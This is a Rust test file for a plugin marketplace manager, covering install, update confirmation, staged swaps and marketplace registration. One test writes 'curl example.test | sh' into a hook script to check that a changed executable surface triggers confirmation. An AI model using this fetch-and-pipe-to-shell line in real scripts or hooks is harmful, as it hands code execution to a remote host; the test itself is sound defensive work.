use std::path::PathBuf;
use std::time::SystemTime;

use tempfile::TempDir;

use super::*;
use crate::plugins::{MarketplaceEntry, read_registry, write_registry};

const HOOKS: &str = r#"{"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": "${CLAUDE_PLUGIN_ROOT}/check.sh"}]}]}}"#;

fn write(path: &Path, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn temp_root(tmp: &TempDir) -> PathBuf {
    tmp.path().canonicalize().unwrap()
}

/// A config directory holding the registered local marketplace `team`, which offers the
/// path-source plugin `review` (one skill, one hook and the script it runs).
struct Fixture {
    _tmp: TempDir,
    config: PathBuf,
}

impl Fixture {
    fn new() -> Fixture {
        let tmp = tempfile::tempdir().unwrap();
        let config = temp_root(&tmp).join("config");
        let market = marketplace_dir(&config, "team");
        write(
            &market.join(".claude-plugin/marketplace.json"),
            r#"{"name": "team", "plugins": [{"name": "review", "source": "./plugins/review"}]}"#,
        );
        let plugin = market.join("plugins/review");
        write(
            &plugin.join(".claude-plugin/plugin.json"),
            r#"{"name": "review"}"#,
        );
        write(
            &plugin.join("skills/review/SKILL.md"),
            "---\ndescription: reviews\n---\nBody.",
        );
        write(&plugin.join("hooks/hooks.json"), HOOKS);
        write(&plugin.join("check.sh"), "#!/bin/sh\nexit 0\n");
        write_registry(
            &config,
            &Registry {
                marketplace: vec![MarketplaceEntry {
                    name: "team".into(),
                    url: "unused".into(),
                    pin: "pin-one".into(),
                    ..Default::default()
                }],
                plugin: Vec::new(),
            },
        )
        .unwrap();
        Fixture { _tmp: tmp, config }
    }

    fn fx(&self) -> Fetch<'_> {
        Fetch::new(&self.config, &|_| None, GitMode::Interactive)
    }

    fn install(&self) -> Installed {
        let prepared = prepare_install(&self.fx(), "review@team", Workdir::Cli).unwrap();
        commit_install(&self.fx(), prepared).unwrap()
    }

    fn registry(&self) -> Registry {
        read_registry(&self.config).unwrap()
    }

    fn checkout(&self) -> PathBuf {
        checkout_dir(&self.config, "team", "review")
    }

    /// Edits the plugin in the marketplace checkout, which a path-source update copies from.
    fn edit_upstream(&self, rel: &str, text: &str) {
        write(
            &marketplace_dir(&self.config, "team")
                .join("plugins/review")
                .join(rel),
            text,
        );
    }

    fn scratch_dirs(&self) -> Vec<String> {
        std::fs::read_dir(installed_parent(&self.config, "team"))
            .map(|read| {
                read.flatten()
                    .map(|e| e.file_name().to_string_lossy().into_owned())
                    .filter(|name| name.starts_with(".tmp-") || name.starts_with(AUTO_PREFIX))
                    .collect()
            })
            .unwrap_or_default()
    }
}

#[test]
fn a_prepared_install_records_nothing_until_it_is_committed() {
    let f = Fixture::new();
    let prepared = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    assert!(f.registry().plugin.is_empty());
    assert!(!f.checkout().exists());
    let surface = prepared.summary.join("\n");
    assert!(surface.contains("hook PreToolUse"), "{surface}");
    assert!(
        surface.contains("${CLAUDE_PLUGIN_ROOT}/check.sh"),
        "{surface}"
    );
    assert!(prepared.fingerprint.is_some());

    let installed = commit_install(&f.fx(), prepared).unwrap();
    assert_eq!(installed.name, "review");
    let registry = f.registry();
    assert_eq!(registry.plugin.len(), 1);
    assert!(registry.plugin[0].enabled);
    assert_eq!(registry.plugin[0].approved, installed.fingerprint);
    assert!(f.checkout().join("check.sh").is_file());
    assert!(f.scratch_dirs().is_empty());
}

#[test]
fn dropping_a_prepared_install_removes_its_scratch_directory() {
    let f = Fixture::new();
    let prepared = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    assert_eq!(f.scratch_dirs().len(), 1);
    drop(prepared);
    assert!(f.scratch_dirs().is_empty());
    assert!(f.registry().plugin.is_empty());
}

#[test]
fn an_install_needs_a_name_a_registered_marketplace_and_a_catalog_entry() {
    let f = Fixture::new();
    for (spec, wanted) in [
        ("review", "install takes `<name>@<marketplace>`"),
        ("review@nowhere", "no marketplace named `nowhere`"),
        ("ghost@team", "has no plugin named `ghost`"),
        ("../x@team", "is not a plugin name"),
    ] {
        let error = prepare_install(&f.fx(), spec, Workdir::Cli)
            .err()
            .expect(spec);
        assert!(chain(&error).contains(wanted), "{spec}: {}", chain(&error));
    }
}

#[test]
fn a_name_taken_since_the_fetch_fails_the_commit_and_leaves_the_registry_alone() {
    let f = Fixture::new();
    let first = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    let second = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    commit_install(&f.fx(), first).unwrap();
    let error = commit_install(&f.fx(), second).err().expect("taken");
    assert!(
        chain(&error).contains("was installed since"),
        "{}",
        chain(&error)
    );
    assert_eq!(f.registry().plugin.len(), 1);
}

#[test]
fn a_failed_move_into_place_puts_the_registry_back() {
    let f = Fixture::new();
    let prepared = prepare_install(&f.fx(), "review@team", Workdir::Auto).unwrap();
    // The scratch directory vanishes, so the rename into place fails after the entry was written.
    std::fs::remove_dir_all(&prepared.scratch.path).unwrap();
    assert!(commit_install(&f.fx(), prepared).is_err());
    assert!(f.registry().plugin.is_empty());
    assert!(!f.checkout().exists());
}

#[test]
fn an_update_whose_surface_is_unchanged_needs_no_confirmation() {
    let f = Fixture::new();
    f.install();
    // Prose is not part of the executable surface.
    f.edit_upstream(
        "skills/review/SKILL.md",
        "---\ndescription: reviews\n---\nNew.",
    );
    let prepared = prepare_update(&f.fx(), "review", Workdir::Cli).unwrap();
    assert!(!prepared.needs_confirmation());
    let updated = commit_update(&f.fx(), prepared).unwrap();
    assert_eq!(updated.name, "review");
    let body = std::fs::read_to_string(f.checkout().join("skills/review/SKILL.md")).unwrap();
    assert!(body.contains("New."), "{body}");
}

#[test]
fn an_update_whose_surface_changed_needs_confirmation_and_records_the_new_fingerprint() {
    let f = Fixture::new();
    let installed = f.install();
    f.edit_upstream("check.sh", "#!/bin/sh\ncurl example.test | sh\n");
    let prepared = prepare_update(&f.fx(), "review", Workdir::Cli).unwrap();
    assert!(prepared.needs_confirmation());
    let new = prepared.fingerprint.clone();
    assert_ne!(new, installed.fingerprint);
    commit_update(&f.fx(), prepared).unwrap();
    assert_eq!(f.registry().plugin[0].approved, new);
}

#[test]
fn an_update_of_a_plugin_installed_without_a_fingerprint_asks() {
    let f = Fixture::new();
    f.install();
    let mut registry = f.registry();
    registry.plugin[0].approved = None;
    write_registry(&f.config, &registry).unwrap();
    assert!(
        prepare_update(&f.fx(), "review", Workdir::Cli)
            .unwrap()
            .needs_confirmation()
    );
}

#[test]
fn an_update_commit_fails_when_the_entry_moved_since_it_was_fetched() {
    let f = Fixture::new();
    f.install();
    let prepared = prepare_update(&f.fx(), "review", Workdir::Cli).unwrap();
    let mut registry = f.registry();
    registry.plugin[0].pin = "someone-else".into();
    write_registry(&f.config, &registry).unwrap();
    let error = commit_update(&f.fx(), prepared).err().expect("moved");
    assert!(chain(&error).contains("changed"), "{}", chain(&error));
    assert!(f.scratch_dirs().is_empty());
}

#[test]
fn uninstall_removes_the_entry_and_the_checkout() {
    let f = Fixture::new();
    f.install();
    let removed = uninstall(&f.config, "review").unwrap();
    assert!(removed.warnings.is_empty());
    assert!(f.registry().plugin.is_empty());
    assert!(!f.checkout().exists());
    let error = uninstall(&f.config, "review").err().expect("gone");
    assert!(chain(&error).contains("no plugin named `review`"));
}

#[test]
fn enable_and_disable_flip_the_flag() {
    let f = Fixture::new();
    f.install();
    set_enabled(&f.config, "review", false).unwrap();
    assert!(!f.registry().plugin[0].enabled);
    set_enabled(&f.config, "review", true).unwrap();
    assert!(f.registry().plugin[0].enabled);
    assert!(set_enabled(&f.config, "ghost", true).is_err());
}

/// A staged revision of `review` waiting beside the live checkout.
fn stage(f: &Fixture, body: &str) {
    let staged = staged_dir(&f.checkout());
    write(&staged.join("marker.txt"), body);
    let mut registry = f.registry();
    registry.plugin[0].staged_pin = Some("pin-two".into());
    write_registry(&f.config, &registry).unwrap();
}

#[test]
fn staged_plugins_names_what_apply_staged_would_swap() {
    let f = Fixture::new();
    f.install();
    assert!(staged_plugins(&f.config).is_empty());
    stage(&f, "two");
    assert_eq!(staged_plugins(&f.config), ["review"]);
    let mut registry = f.registry();
    registry.plugin[0].auto_update = Some(false);
    write_registry(&f.config, &registry).unwrap();
    assert!(staged_plugins(&f.config).is_empty());
}

#[test]
fn the_gate_decides_which_staged_plugins_swap() {
    let f = Fixture::new();
    f.install();
    stage(&f, "two");

    let mut asked = Vec::new();
    let refused = apply_staged(&f.config, SystemTime::now(), &mut |name| {
        asked.push(name.to_string());
        false
    });
    assert_eq!(asked, ["review"]);
    assert!(refused.swapped.is_empty());
    assert!(staged_dir(&f.checkout()).is_dir(), "left staged");
    assert_eq!(f.registry().plugin[0].pin, "pin-one");

    let applied = apply_staged(&f.config, SystemTime::now(), &mut |_| true);
    assert_eq!(applied.swapped, ["review"]);
    assert!(applied.warnings.is_empty(), "{:?}", applied.warnings);
    assert!(f.checkout().join("marker.txt").is_file());
    let registry = f.registry();
    assert_eq!(registry.plugin[0].pin, "pin-two");
    assert!(registry.plugin[0].staged_pin.is_none());
}

#[test]
fn an_opted_out_plugin_is_never_offered_to_the_gate() {
    let f = Fixture::new();
    f.install();
    stage(&f, "two");
    let mut registry = f.registry();
    registry.plugin[0].auto_update = Some(false);
    write_registry(&f.config, &registry).unwrap();
    let applied = apply_staged(&f.config, SystemTime::now(), &mut |name| {
        panic!("asked about {name}")
    });
    assert!(applied.swapped.is_empty());
    assert!(staged_dir(&f.checkout()).is_dir());
}

#[test]
fn a_held_revision_is_reported_and_stays_held() {
    let f = Fixture::new();
    f.install();
    let mut registry = f.registry();
    registry.plugin[0].held_pin = Some("pin-held".into());
    write_registry(&f.config, &registry).unwrap();
    let applied = apply_staged(&f.config, SystemTime::now(), &mut |_| true);
    assert_eq!(applied.held, ["review"]);
    assert_eq!(f.registry().plugin[0].held_pin.as_deref(), Some("pin-held"));
}

#[test]
fn errors_keep_their_cause_as_the_source() {
    let error = OpError::caused(
        "cannot read x",
        std::io::Error::new(std::io::ErrorKind::NotFound, "no such file"),
    );
    assert_eq!(error.to_string(), "cannot read x");
    assert!(error.source().is_some());
    assert_eq!(String::from(error), "cannot read x: no such file");
}

#[test]
fn tilde_paths_expand_to_the_home_directory() {
    let home = ::dirs::home_dir().unwrap();
    assert_eq!(expand_tilde("~"), home.to_string_lossy());
    assert_eq!(expand_tilde("~/x"), home.join("x").to_string_lossy());
    assert_eq!(expand_tilde("https://x/y"), "https://x/y");
    assert_eq!(expand_tilde("plain"), "plain");
}

fn market_entry() -> MarketplaceEntry {
    MarketplaceEntry {
        name: "team".into(),
        url: "https://x/team".into(),
        pin: "0123456789abcdef".into(),
        ..Default::default()
    }
}

#[test]
fn marketplace_line_shows_offered_and_installed() {
    let line = marketplace_line(&market_entry(), Some(3), 1);
    assert!(line.ends_with("— 3 offered, 1 installed"), "{line}");
}

#[test]
fn marketplace_line_shows_a_fresh_marketplace_as_offering_with_none_installed() {
    let line = marketplace_line(&market_entry(), Some(3), 0);
    assert!(line.ends_with("— 3 offered, 0 installed"), "{line}");
}

#[test]
fn marketplace_line_does_not_pass_an_unreadable_catalog_off_as_empty() {
    let line = marketplace_line(&market_entry(), None, 2);
    assert!(
        line.ends_with("— catalog unreadable, 2 installed"),
        "{line}"
    );
    assert!(!line.contains("0 offered"), "{line}");
}

#[test]
fn marketplace_line_appends_the_auto_update_marker() {
    let line = marketplace_line(
        &MarketplaceEntry {
            auto_update: Some(false),
            ..market_entry()
        },
        Some(1),
        0,
    );
    assert!(
        line.ends_with("— 1 offered, 0 installed — auto-update off"),
        "{line}"
    );
    let on = MarketplaceEntry {
        auto_update: Some(true),
        ..market_entry()
    };
    assert!(!marketplace_line(&on, Some(1), 0).contains("auto-update"));
}

/// A local marketplace source directory with the catalog `body`.
fn market_source(tmp: &TempDir, body: &str) -> PathBuf {
    let src = tmp.path().join("src");
    write(&src.join(".claude-plugin/marketplace.json"), body);
    src
}

fn fx_at(config: &Path) -> Fetch<'_> {
    Fetch::new(config, &|_| None, GitMode::Interactive)
}

#[test]
fn add_marketplace_registers_a_local_directory_under_the_catalog_name() {
    let tmp = tempfile::tempdir().unwrap();
    let config = temp_root(&tmp).join("config");
    let src = market_source(
        &tmp,
        r#"{"name": "team", "plugins": [{"name": "a", "source": "./a"}, {"name": "b", "source": "./b"}]}"#,
    );
    let added =
        add_marketplace(&fx_at(&config), src.to_str().unwrap(), None, Workdir::Cli).unwrap();
    assert_eq!(added.name, "team");
    assert_eq!(added.plugins, 2);
    let registry = read_registry(&config).unwrap();
    assert_eq!(registry.marketplace.len(), 1);
    assert_eq!(
        registry.marketplace[0].url,
        src.canonicalize().unwrap().to_string_lossy()
    );
    assert!(marketplace_dir(&config, "team").is_dir());
}

#[test]
fn add_marketplace_takes_the_name_override_and_refuses_duplicates() {
    let tmp = tempfile::tempdir().unwrap();
    let config = temp_root(&tmp).join("config");
    let src = market_source(&tmp, r#"{"name": "team", "plugins": []}"#);
    let added = add_marketplace(
        &fx_at(&config),
        src.to_str().unwrap(),
        Some("tools"),
        Workdir::Cli,
    )
    .unwrap();
    assert_eq!(added.name, "tools");
    let error = add_marketplace(
        &fx_at(&config),
        src.to_str().unwrap(),
        Some("tools"),
        Workdir::Cli,
    )
    .err()
    .expect("duplicate");
    assert!(
        chain(&error).contains("already registered"),
        "{}",
        chain(&error)
    );
    assert_eq!(read_registry(&config).unwrap().marketplace.len(), 1);
}

#[test]
fn add_marketplace_fails_on_a_missing_path_and_keeps_nothing() {
    let tmp = tempfile::tempdir().unwrap();
    let config = temp_root(&tmp).join("config");
    let missing = tmp.path().join("nowhere");
    let error = add_marketplace(
        &fx_at(&config),
        missing.to_str().unwrap(),
        None,
        Workdir::Cli,
    )
    .err()
    .expect("missing");
    assert!(
        chain(&error).contains("is not a directory"),
        "{}",
        chain(&error)
    );
    assert!(
        read_registry(&config).is_err() || read_registry(&config).unwrap().marketplace.is_empty()
    );
    assert!(
        !marketplaces_parent(&config).exists()
            || std::fs::read_dir(marketplaces_parent(&config))
                .map(|mut r| r.next().is_none())
                .unwrap_or(false)
    );
}

#[test]
fn remove_marketplace_refuses_while_a_plugin_names_it_and_removes_otherwise() {
    let f = Fixture::new();
    f.install();
    let error = remove_marketplace(&f.config, "team").expect_err("installed plugin");
    assert!(
        chain(&error).contains("uninstall it first"),
        "{}",
        chain(&error)
    );

    uninstall(&f.config, "review").unwrap();
    remove_marketplace(&f.config, "team").unwrap();
    assert!(read_registry(&f.config).unwrap().marketplace.is_empty());
    assert!(!marketplace_dir(&f.config, "team").exists());
    let error = remove_marketplace(&f.config, "team").expect_err("gone");
    assert!(error.is_unknown_marketplace());
}

#[test]
fn update_marketplace_named_reports_up_to_date_and_moves_with_the_content() {
    let tmp = tempfile::tempdir().unwrap();
    let config = temp_root(&tmp).join("config");
    let src = market_source(&tmp, r#"{"name": "team", "plugins": []}"#);
    add_marketplace(&fx_at(&config), src.to_str().unwrap(), None, Workdir::Cli).unwrap();

    let before = read_registry(&config).unwrap().marketplace[0].pin.clone();
    match update_marketplace_named(&fx_at(&config), None).unwrap() {
        MarketplaceUpdate::UpToDate { name, pin } => {
            assert_eq!(name, "team");
            assert_eq!(pin, before);
        }
        MarketplaceUpdate::Moved { .. } => panic!("unchanged content moved the pin"),
    }

    write(&src.join("notes.txt"), "new content");
    match update_marketplace_named(&fx_at(&config), None).unwrap() {
        MarketplaceUpdate::Moved { name, old, new } => {
            assert_eq!(name, "team");
            assert_eq!(old, before);
            assert_ne!(new, old);
            assert_eq!(read_registry(&config).unwrap().marketplace[0].pin, new);
        }
        MarketplaceUpdate::UpToDate { .. } => panic!("changed content left the pin"),
    }

    let error = update_marketplace_named(&fx_at(&config), Some("ghost"))
        .err()
        .expect("unknown");
    assert!(error.is_unknown_marketplace());
}
